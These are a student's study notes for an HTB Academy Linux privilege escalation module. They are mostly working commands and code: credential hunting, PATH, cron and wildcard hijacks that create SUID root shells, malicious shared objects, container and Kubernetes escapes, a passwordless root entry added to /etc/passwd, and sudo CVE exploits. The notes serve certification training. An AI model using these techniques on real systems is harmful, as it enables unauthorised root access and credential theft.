# Linux Privilege Escalation

> **HTB Academy — CPTS Pathway | Module 25**
> Completed: May 2026

---

## Module Metadata

| Field | Details |
|---|---|
| **Platform** | HTB Academy |
| **Path** | CPTS (Certified Penetration Testing Specialist) |
| **Module Number** | 25 |
| **Difficulty** | Medium |
| **Sections** | 27 |
| **Status** | ✅ Complete |
| **Started** | May 2026 |
| **Completed** | May 2026 |

---

## Table of Contents

| # | Section |
|---|---|
| 01 | [Introduction + Module Overview](#sec-01--introduction--module-overview) |
| 02 | [Information Gathering / Enumeration (Manual)](#sec-02--information-gathering--enumeration-manual) |
| 03 | [Environment Enumeration — OS, Kernel, Users, PATH](#sec-03--environment-enumeration--os-kernel-users-path) |
| 04 | [Linux Services & Internals Enumeration](#sec-04--linux-services--internals-enumeration) |
| 05 | [Credential Hunting](#sec-05--credential-hunting) |
| 06 | [Path Abuse](#sec-06--path-abuse) |
| 07 | [Wildcard Abuse](#sec-07--wildcard-abuse) |
| 08 | [Escaping Restricted Shells](#sec-08--escaping-restricted-shells) |
| 09 | [Special Permissions — SUID / SGID](#sec-09--special-permissions--suid--sgid) |
| 10 | [Sudo Rights Abuse](#sec-10--sudo-rights-abuse) |
| 11 | [Linux Capabilities](#sec-11--linux-capabilities) |
| 12 | [Cron Job Abuse](#sec-12--cron-job-abuse) |
| 13 | [LXC / LXD Container Escalation](#sec-13--lxc--lxd-container-escalation) |
| 14 | [Docker Escalation](#sec-14--docker-escalation) |
| 15 | [Kubernetes](#sec-15--kubernetes) |
| 16 | [Logrotate Abuse](#sec-16--logrotate-abuse) |
| 17 | [Miscellaneous Techniques](#sec-17--miscellaneous-techniques) |
| 18 | [Passwd / Shadow File Abuse](#sec-18--passwd--shadow-file-abuse) |
| 19 | [Sudo CVEs](#sec-19--sudo-cves) |
| 20 | [LD_PRELOAD / LD_LIBRARY_PATH Abuse](#sec-20--ld_preload--ld_library_path-abuse) |
| 21 | [SUID Shared Object Hijacking — RUNPATH / RPATH](#sec-21--suid-shared-object-hijacking--runpath--rpath) |
| 22 | [Python Library Hijacking](#sec-22--python-library-hijacking) |
| 23 | [GTFOBins + Sudo Shell Escapes](#sec-23--gtfobins--sudo-shell-escapes) |
| 24 | [Polkit / PwnKit — CVE-2021-4034](#sec-24--polkit--pwnkit--cve-2021-4034) |
| 25 | [Dirty Pipe — CVE-2022-0847](#sec-25--dirty-pipe--cve-2022-0847) |
| 26 | [Netfilter CVEs](#sec-26--netfilter-cves) |
| 27 | [Linux Hardening + Lynis](#sec-27--linux-hardening--lynis) |

---

## Sec 01 — Introduction + Module Overview

This module covers the complete methodology for escalating privileges on Linux systems — from an initial low-privilege shell to full root access. It spans manual enumeration, misconfiguration abuse, kernel exploits, container escapes, and defensive hardening.

**Core philosophy:**
- Enumeration beats exploitation. Build a complete picture before touching a single exploit
- Misconfigurations and credential exposure account for root access far more often than kernel CVEs
- Kernel CVEs are the last resort, not the first move
- Understanding the mechanism — not just the command — is what matters under exam conditions

**Attack path priority (general):**

```
sudo -l → SUID/Capabilities → Cron jobs → Writable files →
Credential hunting → Service misconfigs → Kernel CVEs
```

---

## Sec 02 — Information Gathering / Enumeration (Manual)

### First Commands — Run Immediately on Shell Landing

```bash
Hackerpatel007_1@htb[/htb]$ id && whoami && hostname
Hackerpatel007_1@htb[/htb]$ sudo -l                    # check within the first 60 seconds, every time
Hackerpatel007_1@htb[/htb]$ uname -a
Hackerpatel007_1@htb[/htb]$ cat /etc/os-release
```

### Users and Groups

```bash
Hackerpatel007_1@htb[/htb]$ cat /etc/passwd
Hackerpatel007_1@htb[/htb]$ cat /etc/group
Hackerpatel007_1@htb[/htb]$ cat /etc/shadow                     # readable? → crack offline
Hackerpatel007_1@htb[/htb]$ w                                   # who else is logged in
Hackerpatel007_1@htb[/htb]$ last                                # login history
```

### Automated Enumeration

```bash
# LinPEAS — broadest automated coverage
Hackerpatel007_1@htb[/htb]$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
Hackerpatel007_1@htb[/htb]$ chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh > /tmp/lp.out 2>&1
Hackerpatel007_1@htb[/htb]$ cat /tmp/lp.out | less -R

# pspy — process monitoring without root (catches hidden crons)
Hackerpatel007_1@htb[/htb]$ chmod +x pspy64 && ./pspy64
```

---

## Sec 03 — Environment Enumeration — OS, Kernel, Users, PATH

### OS and Kernel

```bash
Hackerpatel007_1@htb[/htb]$ cat /etc/os-release
Hackerpatel007_1@htb[/htb]$ uname -a                  # kernel version + architecture
Hackerpatel007_1@htb[/htb]$ cat /proc/version
Hackerpatel007_1@htb[/htb]$ lscpu                     # CPU info — relevant for shellcode arch
Hackerpatel007_1@htb[/htb]$ df -h                     # mounted filesystems
Hackerpatel007_1@htb[/htb]$ cat /etc/fstab            # persistent mounts — credentials sometimes here
```

### Current User Context

```bash
Hackerpatel007_1@htb[/htb]$ id
Hackerpatel007_1@htb[/htb]$ groups
Hackerpatel007_1@htb[/htb]$ sudo -l
Hackerpatel007_1@htb[/htb]$ env                       # environment variables — LD_PRELOAD, credentials
Hackerpatel007_1@htb[/htb]$ echo $PATH
Hackerpatel007_1@htb[/htb]$ echo $SHELL
```

### Installed Software

```bash
Hackerpatel007_1@htb[/htb]$ dpkg -l                   # Debian/Ubuntu
Hackerpatel007_1@htb[/htb]$ rpm -qa                   # RHEL/CentOS
Hackerpatel007_1@htb[/htb]$ ls /usr/local/bin         # custom/non-package binaries
```

### SUID / SGID / Capabilities

```bash
Hackerpatel007_1@htb[/htb]$ find / -perm -4000 -type f 2>/dev/null    # SUID
Hackerpatel007_1@htb[/htb]$ find / -perm -2000 -type f 2>/dev/null    # SGID
Hackerpatel007_1@htb[/htb]$ getcap -r / 2>/dev/null                   # capabilities
```

### Writable Files and Directories

```bash
Hackerpatel007_1@htb[/htb]$ find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
Hackerpatel007_1@htb[/htb]$ find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
```

---

## Sec 04 — Linux Services & Internals Enumeration

### Running Processes and Services

```bash
Hackerpatel007_1@htb[/htb]$ ps aux                              # all running processes — look for creds in cmdline
Hackerpatel007_1@htb[/htb]$ ps aux | grep root                  # root-owned processes only
Hackerpatel007_1@htb[/htb]$ cat /proc/<PID>/cmdline             # cmdline args of a specific PID
Hackerpatel007_1@htb[/htb]$ systemctl list-units --type=service # active systemd services
```

### Network Services

```bash
Hackerpatel007_1@htb[/htb]$ ss -tlnp                            # TCP listeners — internal-only services
Hackerpatel007_1@htb[/htb]$ ss -ulnp                            # UDP listeners
Hackerpatel007_1@htb[/htb]$ netstat -ano 2>/dev/null            # fallback if ss unavailable
Hackerpatel007_1@htb[/htb]$ cat /etc/hosts
Hackerpatel007_1@htb[/htb]$ arp -a                              # ARP table — other hosts on segment
```

### Scheduled Tasks

```bash
Hackerpatel007_1@htb[/htb]$ cat /etc/crontab
Hackerpatel007_1@htb[/htb]$ ls -la /etc/cron.*
Hackerpatel007_1@htb[/htb]$ crontab -l                          # current user's crontab
Hackerpatel007_1@htb[/htb]$ ls -la /var/spool/cron/crontabs/
Hackerpatel007_1@htb[/htb]$ ls -la /etc/cron.d/
```

### Service Configuration Files

```bash
Hackerpatel007_1@htb[/htb]$ ls -la /etc/init.d/                 # SysVinit scripts
Hackerpatel007_1@htb[/htb]$ ls -la /lib/systemd/system/         # systemd unit files
Hackerpatel007_1@htb[/htb]$ find / -name "*.service" 2>/dev/null | xargs grep -l "ExecStart" 2>/dev/null
```

---

## Sec 05 — Credential Hunting

### Shell History

```bash
Hackerpatel007_1@htb[/htb]$ cat ~/.bash_history
Hackerpatel007_1@htb[/htb]$ cat ~/.zsh_history
Hackerpatel007_1@htb[/htb]$ cat /root/.bash_history 2>/dev/null
Hackerpatel007_1@htb[/htb]$ find / -name ".*_history" 2>/dev/null
```

### Configuration Files

```bash
Hackerpatel007_1@htb[/htb]$ find / -name "*.conf" 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null
Hackerpatel007_1@htb[/htb]$ find / -name "*.php" 2>/dev/null | xargs grep -l "password\|db_pass" 2>/dev/null
Hackerpatel007_1@htb[/htb]$ find / -name "*.ini" 2>/dev/null | xargs grep -l "password" 2>/dev/null
Hackerpatel007_1@htb[/htb]$ find / -name "wp-config.php" 2>/dev/null    # WordPress DB credentials
Hackerpatel007_1@htb[/htb]$ find / -name ".env" 2>/dev/null             # dotenv files
```

### SSH Keys

```bash
Hackerpatel007_1@htb[/htb]$ find / -name "id_rsa" 2>/dev/null
Hackerpatel007_1@htb[/htb]$ find / -name "id_ecdsa" 2>/dev/null
Hackerpatel007_1@htb[/htb]$ find / -name "authorized_keys" 2>/dev/null
Hackerpatel007_1@htb[/htb]$ find / -name "known_hosts" 2>/dev/null      # reveals other reachable hosts
```

### Database Files

```bash
Hackerpatel007_1@htb[/htb]$ find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
Hackerpatel007_1@htb[/htb]$ find / -name "*.kdbx" 2>/dev/null           # KeePass databases
```

### Memory and Process Credentials

```bash
Hackerpatel007_1@htb[/htb]$ cat /proc/<PID>/environ | tr '\0' '\n'      # env variables of running process
Hackerpatel007_1@htb[/htb]$ strings /proc/<PID>/mem 2>/dev/null | grep -i "pass\|secret"

# Browser saved credentials
Hackerpatel007_1@htb[/htb]$ find / -path "*/firefox/*.sqlite" 2>/dev/null
Hackerpatel007_1@htb[/htb]$ find / -path "*/chromium/Default/Login Data" 2>/dev/null
```

---

## Sec 06 — Path Abuse

**Condition:** A SUID binary or cron job calls a command without an absolute path — e.g., `system("backup")` instead of `system("/usr/bin/backup")`.

**Attack:** Prepend a writable directory to `$PATH` and create a malicious binary there with the matching name.

```bash
# Confirm the binary calls without absolute path
Hackerpatel007_1@htb[/htb]$ strings /usr/local/bin/suid-binary | grep -v "/" | grep -E "^[a-z]"

# Create malicious binary
Hackerpatel007_1@htb[/htb]$ echo '#!/bin/bash' > /tmp/backup
Hackerpatel007_1@htb[/htb]$ echo '/bin/bash -i' >> /tmp/backup
Hackerpatel007_1@htb[/htb]$ chmod +x /tmp/backup

# Hijack PATH and trigger
Hackerpatel007_1@htb[/htb]$ export PATH=/tmp:$PATH
Hackerpatel007_1@htb[/htb]$ /usr/local/bin/suid-binary
```

---

## Sec 07 — Wildcard Abuse

**Condition:** A cron job runs `tar`, `chown`, or `rsync` with a wildcard (`*`) in a directory you can write to.

**Mechanism:** Files named `--checkpoint=1` or `--checkpoint-action=exec=sh evil.sh` are parsed as command-line flags — not filenames — triggering arbitrary command execution.

```bash
# Example cron: tar czf /backup/archive.tar.gz /var/www/html/*
# You have write access to /var/www/html/

Hackerpatel007_1@htb[/htb]$ echo '#!/bin/bash' > /var/www/html/evil.sh
Hackerpatel007_1@htb[/htb]$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /var/www/html/evil.sh
Hackerpatel007_1@htb[/htb]$ chmod +x /var/www/html/evil.sh
Hackerpatel007_1@htb[/htb]$ touch '/var/www/html/--checkpoint=1'
Hackerpatel007_1@htb[/htb]$ touch '/var/www/html/--checkpoint-action=exec=sh evil.sh'

# Wait for cron to fire
Hackerpatel007_1@htb[/htb]$ /tmp/rootbash -p
```

---

## Sec 08 — Escaping Restricted Shells

Common bypass techniques for `rbash` and similar restricted shells:

```bash
# Via allowed editor
Hackerpatel007_1@htb[/htb]$ vi
:set shell=/bin/bash
:shell

# Via allowed language interpreter
Hackerpatel007_1@htb[/htb]$ python3 -c 'import os; os.system("/bin/bash")'
Hackerpatel007_1@htb[/htb]$ perl -e 'exec "/bin/bash"'
Hackerpatel007_1@htb[/htb]$ ruby -e 'exec "/bin/bash"'
Hackerpatel007_1@htb[/htb]$ lua -e 'os.execute("/bin/bash")'
Hackerpatel007_1@htb[/htb]$ awk 'BEGIN {system("/bin/bash")}'

# Via SSH — bypass login shell restriction
Hackerpatel007_1@htb[/htb]$ ssh user@target -t "bash --noprofile"

# Copy bash and set SUID if cp is allowed
Hackerpatel007_1@htb[/htb]$ cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p
```

---

## Sec 09 — Special Permissions — SUID / SGID

SUID files execute as the file **owner** (often root), not the calling user. Non-standard SUID binaries are a primary escalation target.

```bash
# Find SUID binaries
Hackerpatel007_1@htb[/htb]$ find / -user root -perm -4000 -type f 2>/dev/null

# Find SGID binaries
Hackerpatel007_1@htb[/htb]$ find / -user root -perm -2000 -type f 2>/dev/null

# Examine a suspicious binary
Hackerpatel007_1@htb[/htb]$ ls -la /usr/local/bin/custom-suid
Hackerpatel007_1@htb[/htb]$ strings /usr/local/bin/custom-suid
Hackerpatel007_1@htb[/htb]$ ltrace /usr/local/bin/custom-suid 2>&1
Hackerpatel007_1@htb[/htb]$ strace /usr/local/bin/custom-suid 2>&1
```

**Investigation priority:**
1. Cross-reference against GTFOBins for known escapes
2. Does it call commands without absolute paths? → PATH abuse
3. Does it load shared libraries from a writable path? → shared object hijacking
4. Run with `strace`/`ltrace` to observe runtime behaviour

---

## Sec 10 — Sudo Rights Abuse

```bash
Hackerpatel007_1@htb[/htb]$ sudo -l
```

### NOPASSWD on a Shell or Interpreter

```bash
# sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/python3
Hackerpatel007_1@htb[/htb]$ sudo python3 -c "import os; os.system('/bin/bash')"
```

### NOPASSWD on a File Editor

```bash
# sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/vim
Hackerpatel007_1@htb[/htb]$ sudo vim -c ':!/bin/bash'
```

### NOPASSWD on a File Read Binary

```bash
# sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/less
Hackerpatel007_1@htb[/htb]$ sudo less /etc/hosts
!/bin/bash
```

### Sudo as Another User — Lateral Movement

```bash
# sudoers: user ALL=(admin) NOPASSWD: /bin/bash
Hackerpatel007_1@htb[/htb]$ sudo -u admin /bin/bash
```

### Known Password from Credential Hunting

```bash
Hackerpatel007_1@htb[/htb]$ echo "foundpassword" | sudo -S -l
Hackerpatel007_1@htb[/htb]$ echo "foundpassword" | sudo -S /bin/bash
```

---

## Sec 11 — Linux Capabilities

Capabilities provide finer-grained privilege than SUID. Dangerous capabilities and their exploits:

```bash
Hackerpatel007_1@htb[/htb]$ getcap -r / 2>/dev/null
```

| Capability | Risk | Exploit |
|---|---|---|
| `cap_setuid` | Critical | `python3 -c "import os; os.setuid(0); os.system('/bin/bash')"` |
| `cap_dac_read_search` | High | Read any file — use to read `/etc/shadow` |
| `cap_net_raw` | Medium | Sniff traffic → catch credentials via `tcpdump` |
| `cap_sys_admin` | Critical | Mount filesystems, load kernel modules |
| `cap_sys_ptrace` | High | Inject into running processes |

```bash
# Example: python3 has cap_setuid+ep
Hackerpatel007_1@htb[/htb]$ getcap -r / 2>/dev/null | grep python
# /usr/bin/python3 = cap_setuid+ep

Hackerpatel007_1@htb[/htb]$ python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

---

## Sec 12 — Cron Job Abuse

Cron jobs run on a schedule, often as root. Use `pspy` to catch crons not visible in `/etc/crontab`.

### Writable Script

```bash
Hackerpatel007_1@htb[/htb]$ cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

Hackerpatel007_1@htb[/htb]$ ls -la /opt/scripts/backup.sh
# -rwxrwxrwx = writable

Hackerpatel007_1@htb[/htb]$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh

# Wait for cron to fire
Hackerpatel007_1@htb[/htb]$ /tmp/rootbash -p
```

### Writable Directory in Script PATH

```bash
Hackerpatel007_1@htb[/htb]$ head /opt/scripts/backup.sh | grep PATH
# PATH=/tmp:/usr/local/sbin:/usr/local/bin

Hackerpatel007_1@htb[/htb]$ echo '#!/bin/bash' > /tmp/backup
Hackerpatel007_1@htb[/htb]$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/backup
Hackerpatel007_1@htb[/htb]$ chmod +x /tmp/backup
```

### pspy — Catch Hidden Crons

```bash
Hackerpatel007_1@htb[/htb]$ ./pspy64
# Watch for UID=0 processes firing on a schedule
# 2024/05/01 12:00:01 CMD: UID=0 PID=xxxx | /bin/sh -c /opt/scripts/backup.sh
```

---

## Sec 13 — LXC / LXD Container Escalation

**Condition:** Current user is in the `lxd` group.

```bash
Hackerpatel007_1@htb[/htb]$ id
# uid=1001(user) gid=1001(user) groups=1001(user),116(lxd)
```

```bash
# On Kali — build Alpine image
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/saghul/lxd-alpine-builder.git
Hackerpatel007_1@htb[/htb]$ cd lxd-alpine-builder && sudo bash build-alpine
# Produces: alpine-v3.x-x86_64.tar.gz → transfer to target

# On target
Hackerpatel007_1@htb[/htb]$ lxc image import alpine-v3.x-x86_64.tar.gz --alias alpine
Hackerpatel007_1@htb[/htb]$ lxc init alpine privesc -c security.privileged=true
Hackerpatel007_1@htb[/htb]$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Hackerpatel007_1@htb[/htb]$ lxc start privesc
Hackerpatel007_1@htb[/htb]$ lxc exec privesc /bin/sh

~ # id
# uid=0(root)
~ # chroot /mnt/root bash
root@target:/# id
# uid=0(root) — full host access
```

---

## Sec 14 — Docker Escalation

### Docker Group — Root on Host

```bash
Hackerpatel007_1@htb[/htb]$ id | grep docker

Hackerpatel007_1@htb[/htb]$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# uid=0(root)
```

### Docker Socket Abuse

```bash
Hackerpatel007_1@htb[/htb]$ ls -la /var/run/docker.sock
Hackerpatel007_1@htb[/htb]$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Escape from Inside a Container

```bash
# Identify you are inside a container
Hackerpatel007_1@htb[/htb]$ ls /.dockerenv && echo "Inside Docker"
Hackerpatel007_1@htb[/htb]$ cat /proc/self/cgroup | grep docker

# Check for --privileged flag
Hackerpatel007_1@htb[/htb]$ cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = full capabilities = privileged

# Privileged escape — mount host disk
Hackerpatel007_1@htb[/htb]$ fdisk -l                          # find host disk device
Hackerpatel007_1@htb[/htb]$ mkdir /mnt/host && mount /dev/sda1 /mnt/host
Hackerpatel007_1@htb[/htb]$ chroot /mnt/host bash
```

---

## Sec 15 — Kubernetes

### Identifying a Kubernetes Environment

```bash
Hackerpatel007_1@htb[/htb]$ env | grep -i kube
Hackerpatel007_1@htb[/htb]$ ls /var/run/secrets/kubernetes.io/serviceaccount/
# token  ca.crt  namespace = inside a pod

Hackerpatel007_1@htb[/htb]$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
Hackerpatel007_1@htb[/htb]$ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### Query the API Server with the Pod Service Account Token

```bash
Hackerpatel007_1@htb[/htb]$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
Hackerpatel007_1@htb[/htb]$ APISERVER=https://kubernetes.default.svc
Hackerpatel007_1@htb[/htb]$ CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Enumerate accessible API endpoints
Hackerpatel007_1@htb[/htb]$ curl -s $APISERVER/api --header "Authorization: Bearer $TOKEN" --cacert $CACERT

# List pods in current namespace
Hackerpatel007_1@htb[/htb]$ curl -s $APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/pods \
  --header "Authorization: Bearer $TOKEN" --cacert $CACERT
```

### Privilege Escalation Paths

**Path 1 — Create privileged pod (if SA has pod creation rights):**

```yaml
# /tmp/pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  containers:
  - name: privesc
    image: ubuntu
    command: ["/bin/bash", "-c", "cp /host/bin/bash /host/tmp/rootbash && chmod +s /host/tmp/rootbash && sleep 3600"]
    volumeMounts:
    - mountPath: /host
      name: host-root
    securityContext:
      privileged: true
  volumes:
  - name: host-root
    hostPath:
      path: /
  hostPID: true
  hostNetwork: true
```

```bash
Hackerpatel007_1@htb[/htb]$ kubectl apply -f /tmp/pod.yaml --token=$TOKEN
# Wait for pod to run, then:
Hackerpatel007_1@htb[/htb]$ /tmp/rootbash -p
```

**Path 2 — Extract secrets from the API (other service account tokens):**

```bash
Hackerpatel007_1@htb[/htb]$ curl -s $APISERVER/api/v1/namespaces/default/secrets \
  --header "Authorization: Bearer $TOKEN" --cacert $CACERT | python3 -m json.tool
```

**Path 3 — kubectl with elevated SA permissions:**

```bash
Hackerpatel007_1@htb[/htb]$ kubectl auth can-i --list          # what can this SA do?
Hackerpatel007_1@htb[/htb]$ kubectl get secrets -A
Hackerpatel007_1@htb[/htb]$ kubectl exec -it <pod> -- /bin/bash
```

---

## Sec 16 — Logrotate Abuse

**Condition:** Write access to a log file processed by logrotate AND logrotate version < 3.18.0.

```bash
Hackerpatel007_1@htb[/htb]$ logrotate --version
# logrotate 3.11.0 = vulnerable

Hackerpatel007_1@htb[/htb]$ cat /etc/logrotate.d/nginx         # confirm the target log path
```

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/whotwagner/logrotten.git /tmp/lr
Hackerpatel007_1@htb[/htb]$ cd /tmp/lr && gcc logrotten.c -o logrotten

Hackerpatel007_1@htb[/htb]$ echo '#!/bin/bash' > /tmp/payload
Hackerpatel007_1@htb[/htb]$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/payload
Hackerpatel007_1@htb[/htb]$ chmod +x /tmp/payload

# Trigger rotation by writing to the log file
Hackerpatel007_1@htb[/htb]$ ./logrotten -p /tmp/payload /var/log/nginx/access.log &
Hackerpatel007_1@htb[/htb]$ echo "trigger" >> /var/log/nginx/access.log

Hackerpatel007_1@htb[/htb]$ /tmp/rootbash -p
```

---

## Sec 17 — Miscellaneous Techniques

### Weak NFS — no_root_squash

**Condition:** `/etc/exports` contains `no_root_squash` — root on the mounting client = root on the share.

```bash
# On target
Hackerpatel007_1@htb[/htb]$ cat /etc/exports
# /shared *(rw,no_root_squash)

# On Kali (as root)
Hackerpatel007_1@htb[/htb]$ showmount -e <target-ip>
Hackerpatel007_1@htb[/htb]$ mkdir /mnt/nfs && mount -t nfs <target-ip>:/shared /mnt/nfs
Hackerpatel007_1@htb[/htb]$ cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash

# Back on target
Hackerpatel007_1@htb[/htb]$ /shared/rootbash -p
```

### tmux Session Hijacking

```bash
# List accessible tmux sockets
Hackerpatel007_1@htb[/htb]$ find /tmp -name "tmux-*" -type d 2>/dev/null
Hackerpatel007_1@htb[/htb]$ ls -la /tmp/tmux-0/default         # check ownership and permissions

# Attach to another user's session if accessible
Hackerpatel007_1@htb[/htb]$ tmux -S /tmp/tmux-0/default attach
```

### GNU screen — Shared Session Hijacking

```bash
# List running screen sessions
Hackerpatel007_1@htb[/htb]$ screen -ls

# Attempt to attach to a root-owned multiuser session
Hackerpatel007_1@htb[/htb]$ screen -x root/session-name

# screen SUID exploit — versions <= 4.5.0 (CVE-2017-5618)
Hackerpatel007_1@htb[/htb]$ screen --version
```

---

## Sec 18 — Passwd / Shadow File Abuse

### World-Writable /etc/passwd

```bash
Hackerpatel007_1@htb[/htb]$ ls -la /etc/passwd
# -rw-rw-rw- = world-writable

Hackerpatel007_1@htb[/htb]$ echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
Hackerpatel007_1@htb[/htb]$ su root2

root@target:/# id
# uid=0(root)
```

### World-Readable /etc/shadow

```bash
Hackerpatel007_1@htb[/htb]$ ls -la /etc/shadow

Hackerpatel007_1@htb[/htb]$ grep root /etc/shadow
# root:$6$xyz...:...:

# Crack offline — hashcat mode depends on hash type
Hackerpatel007_1@htb[/htb]$ hashcat -m 1800 root_hash.txt /usr/share/wordlists/rockyou.txt
# -m 1800 = sha512crypt ($6$) | -m 500 = md5crypt ($1$) | -m 1500 = descrypt
```

---

## Sec 19 — Sudo CVEs

```bash
Hackerpatel007_1@htb[/htb]$ sudo --version     # check version before attempting any CVE
```

| CVE | Affected Versions | Type | Exploit |
|---|---|---|---|
| CVE-2019-14287 | < 1.8.28 | User ID `-1` treated as `0` | `sudo -u#-1 /bin/bash` |
| CVE-2021-3156 | 1.8.2 – 1.9.5p1 | Heap buffer overflow (Baron Samedit) | `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` |
| CVE-2023-22809 | ≤ 1.9.12p0 | sudoedit `--` injection | `EDITOR='vim -- /etc/sudoers' sudoedit /etc/motd` |

### CVE-2019-14287

```bash
# Requires: sudoers rule with !root, e.g.: user ALL=(ALL, !root) /bin/bash
Hackerpatel007_1@htb[/htb]$ sudo -u#-1 /bin/bash
```

### CVE-2021-3156 — Baron Samedit

```bash
# Verify vulnerable
Hackerpatel007_1@htb[/htb]$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# "malloc(): memory corruption" = vulnerable | "usage: sudoedit" = patched

Hackerpatel007_1@htb[/htb]$ git clone https://github.com/blasty/CVE-2021-3156.git /tmp/baron
Hackerpatel007_1@htb[/htb]$ cd /tmp/baron && make && ./sudo-hax-me-a-sandwich
```

### CVE-2023-22809 — sudoedit Bypass

```bash
# Requires: any sudoedit rule, e.g.: user ALL=(root) sudoedit /etc/motd
Hackerpatel007_1@htb[/htb]$ EDITOR='vim -- /etc/sudoers' sudoedit /etc/motd
# vim opens /etc/sudoers as root — add privilege escalation line
```

---

## Sec 20 — LD_PRELOAD / LD_LIBRARY_PATH Abuse

### LD_PRELOAD (env_keep in sudoers)

**Condition:** `env_keep+=LD_PRELOAD` in `/etc/sudoers` AND at least one sudo-allowed command exists.

```c
// /tmp/evil.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
Hackerpatel007_1@htb[/htb]$ gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c
Hackerpatel007_1@htb[/htb]$ sudo LD_PRELOAD=/tmp/evil.so <any_allowed_command>
# root shell spawns before the real command runs
```

### LD_LIBRARY_PATH Abuse

**Condition:** `env_keep+=LD_LIBRARY_PATH` in sudoers.

```bash
# Find which libraries the allowed binary loads
Hackerpatel007_1@htb[/htb]$ ldd /usr/bin/allowed-binary
# libcustom.so.1 => /usr/lib/libcustom.so.1

# Create malicious replacement in /tmp
Hackerpatel007_1@htb[/htb]$ gcc -shared -fPIC -nostartfiles -o /tmp/libcustom.so.1 /tmp/evil.c
Hackerpatel007_1@htb[/htb]$ sudo LD_LIBRARY_PATH=/tmp <any_allowed_command>
```

---

## Sec 21 — SUID Shared Object Hijacking — RUNPATH / RPATH

**Condition:** SUID binary has a writable directory in its `RUNPATH`/`RPATH`, and loads a library that doesn't exist at that path.

```bash
# Step 1 — Find the RUNPATH
Hackerpatel007_1@htb[/htb]$ readelf -d /path/to/suid-binary | grep -E "RUNPATH|RPATH"
# 0x000000000000001d (RUNPATH) Library runpath: [/development/lib]

# Step 2 — Confirm writable
Hackerpatel007_1@htb[/htb]$ ls -la /development/lib

# Step 3 — Find the missing library
Hackerpatel007_1@htb[/htb]$ strace /path/to/suid-binary 2>&1 | grep "No such file"
# open("/development/lib/libshared.so", O_RDONLY) = -1 ENOENT

# Step 4 — Create malicious .so
Hackerpatel007_1@htb[/htb]$ cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void inject() __attribute__((constructor));
void inject() { setuid(0); system("/bin/bash -p"); }
EOF
Hackerpatel007_1@htb[/htb]$ gcc -shared -fPIC -o /development/lib/libshared.so /tmp/evil.c

# Step 5 — Execute SUID binary
Hackerpatel007_1@htb[/htb]$ /path/to/suid-binary
```

---

## Sec 22 — Python Library Hijacking

**Condition:** `sudo python3 script.py` runs and a directory in `sys.path` is writable.

```bash
# Step 1 — Check sys.path order
Hackerpatel007_1@htb[/htb]$ sudo python3 -c "import sys; print(sys.path)"

# Step 2 — Find writable entries
Hackerpatel007_1@htb[/htb]$ ls -la /usr/lib/python3/dist-packages/

# Step 3 — Identify what the script imports
Hackerpatel007_1@htb[/htb]$ head -20 /opt/script.py | grep import
# import psutil

# Step 4 — Drop malicious module in first writable sys.path dir
Hackerpatel007_1@htb[/htb]$ cat > /writable/path/psutil.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
EOF

# Step 5 — Trigger
Hackerpatel007_1@htb[/htb]$ sudo python3 /opt/script.py
Hackerpatel007_1@htb[/htb]$ /tmp/rootbash -p
```

---

## Sec 23 — GTFOBins + Sudo Shell Escapes

> Reference: [https://gtfobins.github.io/](https://gtfobins.github.io/)

**Rule:** Any binary that can read files, write files, or execute commands is a potential GTFOBins entry.

```bash
Hackerpatel007_1@htb[/htb]$ sudo -l
```

| Binary | Escape Command |
|---|---|
| `vim` | `sudo vim -c ':!/bin/bash'` |
| `find` | `sudo find . -exec /bin/bash \;` |
| `python3` | `sudo python3 -c "import os; os.system('/bin/bash')"` |
| `less` | `sudo less /etc/hosts` → `!/bin/bash` |
| `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `nmap` | `sudo nmap --interactive` → `!sh` |
| `perl` | `sudo perl -e 'exec "/bin/bash"'` |
| `ruby` | `sudo ruby -e 'exec "/bin/bash"'` |
| `lua` | `sudo lua -e 'os.execute("/bin/bash")'` |
| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
